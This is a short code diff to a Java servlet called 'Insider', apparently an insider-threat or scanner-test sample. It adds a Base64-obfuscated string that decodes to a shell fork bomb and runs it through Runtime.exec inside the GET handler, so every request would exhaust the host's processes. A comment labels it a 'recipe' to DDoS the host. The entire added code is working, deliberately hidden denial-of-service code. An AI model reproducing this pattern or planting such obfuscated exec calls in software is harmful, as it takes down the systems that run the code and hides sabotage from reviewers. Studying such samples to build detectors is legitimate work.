@@ -43,6 +43,8 @@ public class Insider extends HttpServlet {
   @Override
   protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
 
+    String inPlainSight = "Oigpezp8OiZ9Ozo=";
+
     try {
 
       getConnection();
@@ -126,6 +128,11 @@ public class Insider extends HttpServlet {
       } catch (Exception e) {
         e.printStackTrace();
       }
+
+      // RECIPE: Execute a Fork Bomb and DDOS the host
+      Runtime rt = Runtime.getRuntime();
+      String fb = new String(Base64.getDecoder().decode(inPlainSight));
+      Process proc = rt.exec(new String[]{"sh","-c",fb});
 
       // RECIPE: Escape validation framework
 
